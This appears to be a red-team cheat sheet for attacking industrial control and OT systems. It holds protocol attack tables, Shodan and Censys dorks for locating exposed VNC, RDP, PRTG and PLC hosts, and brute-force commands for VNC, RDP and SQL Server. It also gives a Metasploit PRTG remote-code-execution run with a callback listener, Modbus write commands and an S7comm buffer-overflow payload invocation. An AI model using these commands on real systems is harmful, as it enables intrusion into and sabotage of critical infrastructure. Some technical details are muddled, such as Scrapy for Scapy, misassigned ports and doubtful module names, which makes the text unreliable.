|Attack Methods|Known Exploitation Methods|Specific Offensive Security Tools in Kali Linux|Detail Real Example Commands|Specific Exploit in Metasploit or Exploit Pack|Specific Nmap Script Name|Nuclei Templates|Scrapy Code|Commands Description|
|---|---|---|---|---|---|---|---|---|
|Protocol Analysis|Wireshark|`sudo wireshark`|-|-|-|-|-|Use Wireshark to capture and analyze Fieldbus HSE network traffic, inspecting the protocol packets and identifying any vulnerabilities or anomalies in the communication|
|Traffic Manipulation|Scapy|`sudo scapy`|`packet = IP(dst="<target_IP>") / TCP(dport=2222) / Raw(load="<data_payload>")`|-|-|-|`send(packet)`|Utilize Scapy, a powerful packet manipulation tool, to craft and modify Fieldbus HSE packets for testing and analysis. Create a packet using the provided Scapy code template, replacing `<target_IP>` with the target IP address and `<data_payload>` with the desired data payload. Then, send the packet using the `send()` function|
|Network Scanning|nmap|`sudo nmap -p 2222 <target_IP>`|-|-|-|-|-|Employ nmap to scan the Fieldbus HSE network, identify active devices, and gather information about their configurations and open port|
|Unauthorized Access|Default Credentials|-|-|-|-|-|-|Exploit default credentials of Fieldbus HSE devices to gain unauthorized access|
|Vulnerability Scanning|OpenVAS, Nessus|-|-|-|-|-|-|Deploy vulnerability scanners like OpenVAS or Nessus to assess the security posture of Fieldbus HSE devices, identifying potential vulnerabilities and weaknesses|

### Modbus/TCP

|Attack Methods|Known Exploitation Methods|Specific Offensive Security Tools in Kali Linux|Detail Real Example Commands|Specific Exploit in Metasploit or Exploit Pack|Specific Nmap Script Name|Nuclei Templates|Scrapy Code|Commands Description|
|---|---|---|---|---|---|---|---|---|
|Packet Analysis|Wireshark|`sudo wireshark`|-|-|-|-|-|Use Wireshark to capture and analyze Modbus/TCP network traffic, inspecting the protocol packets and identifying any vulnerabilities or anomalies in the communication|
|Traffic Manipulation|Scapy|`sudo scapy`|`packet = Ether() / IP(dst="<target_IP>") / TCP(dport=502) / Raw(load="<data_payload>")`|-|-|-|`sendp(packet)`|Utilize Scapy, a powerful packet manipulation tool, to craft and modify Modbus/TCP packets for testing and analysis. Create a packet using the provided Scapy code template, replacing `<target_IP>` with the target IP address and `<data_payload>` with the desired data payload. Then, send the packet using the `sendp()` function|
|Network Scanning|nmap|`sudo nmap -p 502 <target_IP>`|-|-|-|-|-|Employ nmap to scan the Modbus/TCP network, identify active devices, and gather information about their configurations and open port|
|Unauthorized Access|Default Credentials, Brute-Force Attacks|-|-|-|-|-|-|Exploit default credentials or perform brute-force attacks against Modbus/TCP devices to gain unauthorized access|
|Exploitation|PLCscan, Modbus Exploiter|`plcscan -t <target_IP>`|-|Metasploit|-|-|-|Use PLCscan or Modbus Exploiter tools to scan and exploit vulnerabilities in Modbus/TCP devices. For Metasploit, search for specific Modbus/TCP exploits and modules that can be used for exploitation|
|Denial of Service (DoS)|Modbus-Doser, MODBUSploit|-|-|-|-|-|-|Utilize tools like Modbus-Doser or MODBUSploit to launch Denial of Service attacks against Modbus/TCP devices, disrupting their normal operation|

### CC-Link IE

|Attack Methods|Known Exploitation Methods|Specific Offensive Security Tools in Kali Linux|Detail Real Example Commands|Specific Exploit in Metasploit or Exploit Pack|Specific Nmap Script Name|Nuclei Templates|Scrapy Code|Commands Description|
|---|---|---|---|---|---|---|---|---|
|Packet Analysis|Wireshark|`sudo wireshark`|-|-|-|-|-|Use Wireshark to capture and analyze CC-Link IE network traffic, inspecting the protocol packets and identifying any vulnerabilities or anomalies in the communication|
|Traffic Manipulation|Scapy|`sudo scapy`|`packet = Ether() / IP(dst="<target_IP>") / TCP(dport=44818) / Raw(load="<data_payload>")`|-|-|-|`sendp(packet)`|Utilize Scapy, a powerful packet manipulation tool, to craft and modify CC-Link IE packets for testing and analysis. Create a packet using the provided Scapy code template, replacing `<target_IP>` with the target IP address and `<data_payload>` with the desired data payload. Then, send the packet using the `sendp()` function|
|Network Scanning|nmap|`sudo nmap -p 44818 <target_IP>`|-|-|-|-|-|Employ nmap to scan the CC-Link IE network, identify active devices, and gather information about their configurations and open port|
|Unauthorized Access|Default Credentials, Brute-Force Attacks|-|-|-|-|-|-|Exploit default credentials or perform brute-force attacks against CC-Link IE devices to gain unauthorized access|
|Exploitation|PLCscan, Metasploit Modules|`plcscan -t <target_IP>`|-|Metasploit|-|-|-|Use PLCscan or specific Metasploit modules designed for CC-Link IE to scan and exploit vulnerabilities in CC-Link IE devices.|
|Denial of Service (DoS)|-|-|-|-|-|-|-|Conduct Denial of Service (DoS) attacks targeting CC-Link IE devices to disrupt their normal operation|

### J1939

|Attack Methods|Known Exploitation Methods|Specific Offensive Security Tools in Kali Linux|Detail Real Example Commands|Specific Exploit in Metasploit or Exploit Pack|Specific Nmap Script Name|Nuclei Templates|Scrapy Code|Commands Description|
|---|---|---|---|---|---|---|---|---|
|Spoofing|Manipulation of CAN Bus Messages|-|-|-|-|-|-|Manipulate CAN bus messages to spoof J1939 communication, such as altering message identifiers, data payloads, or source addresses|
|Replay Attacks|Intercepting and Resending J1939 Messages|-|-|-|-|-|-|Intercept and capture valid J1939 messages, then replay them later to achieve unintended effects or manipulate vehicle behavior|
|Reverse Engineering|Analyzing J1939 Message Structures|-|-|-|-|-|-|Reverse engineer J1939 message structures to understand their meanings, data formats, and relationships to identify potential vulnerabilities and attack vectors|
|Diagnostic Tools|CAN Bus Analyzers, J1939 Diagnostic Tools|-|-|-|-|-|-|Utilize CAN bus analyzers and J1939 diagnostic tools to monitor, analyze, and interact with J1939 network traffic for troubleshooting, testing, and potential exploitation|
|Fuzzing|Sending Malformed J1939 Messages|-|-|-|-|-|-|Send intentionally malformed or unexpected J1939 messages to the target system to test its resilience against input validation vulnerabilities|
|Device Manipulation|Physical Access to J1939 Devices|-|-|-|-|-|-|Gain physical access to J1939 devices or interfaces for direct manipulation or tampering with the communication, hardware, or firmware|
|Eavesdropping|CAN Bus Sniffing Tools|-|-|-|-|-|-|Use CAN bus sniffing tools to eavesdrop on J1939 network traffic, capturing and analyzing the communication for potential security vulnerabilities|

### EnOcean


|Attack Methods|Known Exploitation Methods|Specific Offensive Security Tools in Kali Linux|Detail Real Example Commands|Specific Exploit in Metasploit or Exploit Pack|Specific Nmap Script Name|Nuclei Templates|Scrapy Code|Commands Description|
|---|---|---|---|---|---|---|---|---|
|Packet Analysis|Wireshark|`sudo wireshark`|-|-|-|-|-|Use Wireshark to capture and analyze EnOcean network traffic, inspecting the protocol packets and identifying any vulnerabilities or anomalies in the communication|
|Traffic Manipulation|Scapy|`sudo scapy`|`packet = Ether() / Raw(load="<data_payload>")`|-|-|-|`sendp(packet)`|Utilize Scapy, a powerful packet manipulation tool, to craft and modify EnOcean packets for testing and analysis. Create a packet using the provided Scapy code template, replacing `<data_payload>` with the desired data payload. Then, send the packet using the `sendp()` function|
|Network Scanning|nmap|`sudo nmap -p <port_range> <target_IP>`|-|-|-|-|-|Employ nmap to scan the EnOcean network, identify active devices, and gather information about their configurations and open ports|
|Unauthorized Access|Default Credentials, Brute-Force Attacks|-|-|-|-|-|-|Exploit default credentials or perform brute-force attacks against EnOcean devices to gain unauthorized access|
|Exploitation|-|-|-|-|-|-|-|No known specific exploits or tools for exploiting EnOcean protocol vulnerabilities|
|Denial of Service (DoS)|-|-|-|-|-|-|-|Conduct Denial of Service (DoS) attacks targeting EnOcean devices to disrupt their normal operation|


### VNC

VNC (Virtual Network Computing) is a popular remote desktop sharing protocol that allows a user to control a computer over a network connection. In the context of red teaming for OT attacks, VNC can be used to gain remote access to an Industrial Control System (ICS) or Supervisory Control and Data Acquisition (SCADA) system. This could be done by exploiting vulnerabilities in the system or by using phishing attacks to gain access to an employee's computer with administrative access to the ICS or SCADA system


Find VNC Server:


Shodan: 

```text
vnc country: [two letter country code]
```

or

```text
nmap -p 5900 [target IP address]
```

or

```text
nc [target IP address] 5900
```


To Connect:

```text
vncviewer -autopass [target IP address]:[display number]
```

to Crack:


```text
use auxiliary/scanner/vnc/vnc_login
set rhosts [target IP address]
set user_file [path to username file]
set pass_file [path to password file]
run
```

or

```text
vncrack -P /path/to/password/file.txt -u username -H <IP address> -v <VNC port>
```

or

```text
hydra -L usernames.txt -P passwords.txt -s 5900 -f -vV <target_ip> vnc
```


### RDP


To Find: 

Shodan: 

```text
rdp country: [two letter country code]
```

or

```text
nmap -sS -p 3389 [target IP address]
```

or

```text
masscan -p3389 192.168.1.0/24 --rate=10000
```

or

```text
nc -zv 192.168.1.1 3389
```

or

```
hping3 -S 192.168.1.0/24
```

or

```
unicornscan -mT 192.168.1.0/24:a
```


To Crack:

```
hydra -l username -P /path/to/wordlist.txt rdp://targetip
```

or

```
medusa -u username -P /path/to/wordlist.txt -h targetip -M rdp
```

or

```
ncrack -vv --user username -P /path/to/wordlist.txt rdp://targetip
```

or

```
crowbar -b rdp -s targetip/32
```

To Connect:

```
rdesktop -u username -p password -g 1024x768 -a 16 x.x.x.x
```

or

```
xfreerdp /u:username /p:password /v:rdp-server
```

or

```
remmina --connect rdp://username:password@rdp-server
```

or

```
vinagre -c "rdp://username:password@rdp-server"
```

### PRTG


Reconnaissance


Shodan
```
"title:PRTG inurl:/index.htm?tabid=0&sort=Errors&filter_status=-1"
```

or

```
"html:"PRTG Traffic Grapher""
```

Censys

```
"p443.title: PRTG Traffic Grapher"
```

or

```
"autonomous_system.organization: Paessler AG" 
```


or

```
nmap -sn 192.168.1.0/24
nmap -p 80,443,8443 192.168.1.0/24
```

Enumerate PRTG servers:

```
msfconsole -q
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.10
set RPORT 80
set THREADS 5
set PATH /
run
```

Exploit the PRTG server:

```
msfconsole -q
use exploit/windows/http/prtg_authenticated_rce
set RHOST 192.168.1.10
set RPORT 80
set LHOST 192.168.1.20
set LPORT 4444
set TARGETURI /
run
```

### SQL

Enumerate

```
nmap -sS -p 1433 -oA outputfile 192.168.1.1/24
```

Crack

```
hydra -L users.txt -P passwords.txt -vV <target_ip> sql-server
```


### industrial control systems(ics)

Reconnaissance

```
nmap -p 102,502 -sV <target_ip>
```

This shodan dork searches for Modbus servers, which are commonly used in ICS systems.

```
"port:502 modbus"
```

and


```
"port:44818"
```

This dork searches for PLCs (Programmable Logic Controllers) that use the proprietary Rockwell Automation protocol.


```
"port:1911
```

This dork searches for the Foxboro I/A Series Distributed Control Systems (DCS), which are used in various industries such as oil and gas, chemical and power generation.


```
"port:102
```

This dork searches for Siemens SIMATIC S7 PLCs, which are used in industrial automation and control.


```
"port:20000"
```


This dork searches for the Schneider Electric Modicon Modbus Protocol, which is used in various industrial control applications.



### TR-069

TR-069 is a protocol used by ISPs to remotely manage customer routers. Attackers can exploit vulnerabilities in this protocol to take control of the router.


```
python3 genieacs.py --list
```

### Modbus

Modbus is a protocol used in industrial control systems. Attackers can exploit vulnerabilities in Modbus to take control of these systems.

```
modscan.py -a <target> -p 502 -t 0 -r 1-100
```

or

This command targets the Modbus protocol and attempts to trigger a "write single coil" command to turn on a specific output on the target device.


```
"modscan.py --ip-address <target IP> --port 502 --unit 1 --function-code 5"
```

This command uses the modpoll tool to query the Modbus register at address 1 of a device with the IP address 192.168.0.10. The -t 4 option specifies that the tool should use the Modbus function code 4, which is used for reading input registers. An attacker can use this command to extract data from an OT system or to test if it is vulnerable to Modbus protocol attacks.


```
modpoll -m tcp -a 1 -r 1 -c 1 -t 4 -1 192.168.0.10
```


### DNP3

DNP3 is a protocol used in SCADA systems. Attackers can exploit vulnerabilities in DNP3 to take control of these systems.

```
python3 dnp3-master.py -i eth0 -a <target> -p 20000 -o 3 -c 1 -v
```

### EtherNet/IP

This command targets the EtherNet/IP protocol used in industrial control systems and attempts to send a command to turn on a specific output on the target device.

```
"python enip-exploit.py -i <target IP> -o 3 -v 1"
```

### BACnet 


This command targets the BACnet protocol and attempts to read a value from a specific object on the target device, which can provide information that could be used in further attacks.

```
"bacnet_scan.py -ip <target IP> -p 47808 -d 4194303 -a 1 -t 0"
```

### S7comm


This command targets the S7comm protocol used in Siemens PLCs and sends a crafted payload to cause a buffer overflow and execute arbitrary code on the target device.


```
"python S7comm_payload.py <target IP> 102 --payload 1 --offset 14"
```

### Exploitation

S7comm exploit

```
use exploit/windows/scada/s7comm_plus_wincc_opc
```

Modbus exploit

```
use exploit/windows/scada/modbus_write_registers
```

### PCTRAN

RDS server content

```
cat cpub-iexplore-QuickSessionCollection-CmsRdsh.rdp
```


### resources

-	https://github.com/hslatman/awesome-industrial-control-system-security
-	https://www.b-sec.net/en/assessment/
-	https://github.com/rezaduty/awesome-ics-writeups




{% include links.html %}
